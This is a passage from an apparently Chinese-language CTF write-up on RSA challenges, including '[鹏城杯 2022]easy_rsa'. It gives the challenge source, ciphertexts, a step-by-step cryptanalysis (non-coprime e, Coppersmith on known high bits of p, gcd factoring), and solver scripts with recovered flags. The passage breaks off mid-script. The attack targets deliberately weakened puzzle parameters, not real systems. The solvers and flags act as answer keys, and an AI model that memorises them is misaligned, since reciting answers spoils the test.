class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>n3=<span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br>high_p=<span class="hljs-number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br>unknown_bits=<span class="hljs-number">200</span><br>high_p=high_p&lt;&lt;unknown_bits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n3))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>msg3=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c3,invert(e3,(p-<span class="hljs-number">1</span>)*(n3//p-<span class="hljs-number">1</span>)),n3)))<br><br>text=msg1+msg2+msg3<br><span class="hljs-built_in">print</span>(text)<br><span class="hljs-built_in">print</span>(md5(text).hexdigest())<br><span class="hljs-comment">#b&quot; \nO wild West Wind, thou breath of Autumn&#x27;s being,\nThou, from whose unseen presence the leaves dead\nAre driven, like ghosts from an enchanter fleeing,\nYellow, and black, and pale, and hectic red,\nPestilence-stricken multitudes: O thou,\nWho chariotest to their dark wintry bed\n&quot;</span><br><span class="hljs-comment">#3943e8843a19149497956901e5d98639</span><br><span class="hljs-comment">#NSSCTF&#123;3943e8843a19149497956901e5d98639&#125;</span><br></code></pre></td></tr></table></figure><h1 id="鹏城杯-2022easy_rsa"><a class="markdownIt-Anchor" href="#鹏城杯-2022easy_rsa"></a> [鹏城杯 2022]easy_rsa</h1><h2 id="题目-16"><a class="markdownIt-Anchor" href="#题目-16"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>m1 = flag[<span class="hljs-number">0</span>:<span class="hljs-number">12</span>]<br>m2 = flag[<span class="hljs-number">12</span>:<span class="hljs-number">24</span>]<br>m3 = flag[<span class="hljs-number">24</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt1</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        e = random.randint(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>)<br>        p = getPrime(<span class="hljs-number">1024</span>)<br>        q = getPrime(<span class="hljs-number">1024</span>)<br>        phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>        t = gmpy2.gcd(e, phi_n)<br>        <span class="hljs-keyword">if</span> gmpy2.invert(e // t, phi_n) <span class="hljs-keyword">and</span> t != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>    n = p * q<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-built_in">format</span>(p, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-built_in">format</span>(q, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt2</span>(<span class="hljs-params">m</span>):<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    c = gmpy2.powmod(m, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-built_in">format</span>((p &gt;&gt; <span class="hljs-number">60</span>) &lt;&lt; <span class="hljs-number">60</span>, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-built_in">format</span>(n, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt3</span>(<span class="hljs-params">m</span>):<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    M = <span class="hljs-number">2022</span> * m * <span class="hljs-number">1011</span> * p<br>    c = <span class="hljs-built_in">pow</span>(M, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-built_in">format</span>(n, <span class="hljs-string">&#x27;x&#x27;</span>),<span class="hljs-string">&#x27;e&#x27;</span>:<span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    encrypt1(bytes_to_long(m1))<br>    encrypt2(bytes_to_long(m2))<br>    encrypt3(bytes_to_long(m3))<br><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e&#x27;, &#x27;p&#x27;: &#x27;bb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd&#x27;, &#x27;q&#x27;: &#x27;bb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1&#x27;, &#x27;e&#x27;: &#x27;292&#x27;&#125;</span><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f&#x27;, &#x27;p&#x27;: &#x27;a9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000&#x27;, &#x27;e&#x27;: &#x27;10001&#x27;, &#x27;n&#x27;: &#x27;841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65&#x27;&#125;</span><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df&#x27;, &#x27;n&#x27;: &#x27;c2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069&#x27;, &#x27;e&#x27;: &#x27;10001&#x27;&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="分析-16"><a class="markdownIt-Anchor" href="#分析-16"></a> 分析</h2><p>将flag分成了三个部分，一一来看</p><h3 id="第一部分-2"><a class="markdownIt-Anchor" href="#第一部分-2"></a> 第一部分</h3><p>给了p和q，但是经过计算e和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>并不互素</p><p>但是最大公约数是2</p><p>我们计算e//2，当作新的e来解密，最后求解出来开2次根就结果了</p><p>证明：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>=</mo><mn>2</mn><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mspace linebreak="newline"></mspace><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>c</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></msup><mo>=</mo><msup><mi>m</mi><mrow><mn>2</mn><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></msup><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=m^e\quad mod(n)\\e=2e&#x27;\\d&#x27;e&#x27;=1\quad mod(\phi(n)\\c^{d&#x27;}=m^{ed&#x27;}=m^{2e&#x27;d&#x27;}=m^2\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h3 id="第二部分-2"><a class="markdownIt-Anchor" href="#第二部分-2"></a> 第二部分</h3><p>知道p的高位，利用coppersmith，同上题第三部分套板子就行了</p><h3 id="第三部分-2"><a class="markdownIt-Anchor" href="#第三部分-2"></a> 第三部分</h3><p>经过模p推导可以得到c等于k倍的p，那么我们知道n，就可以跟n求最大公约数得到p</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mn>2022</mn><mo>∗</mo><mi>m</mi><mo>∗</mo><mn>1011</mn><mo>∗</mo><mi>p</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>M</mi><mo>=</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><msup><mi>M</mi><mi>e</mi></msup><mo>=</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>k</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">M=2022*m*1011*p\quad mod(n)\\M=0 \quad mod(p)\\c=M^e=0\quad mod(p)\\c=kp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span></span></span></span></span></p><h2 id="exp-16"><a class="markdownIt-Anchor" href="#exp-16"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c1=<span class="hljs-number">0x27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e</span><br>p1=<span class="hljs-number">0xbb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd</span><br>q1=<span class="hljs-number">0xbb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1</span><br>e1=<span class="hljs-number">0x292</span><br>phi1=(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>g1=gcd(e1,phi1)<br>te1=e1//g1<br>td1=invert(te1,phi1)<br>tm1=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c1,td1,p1*q1))<br>m1=long_to_bytes(iroot(tm1,<span 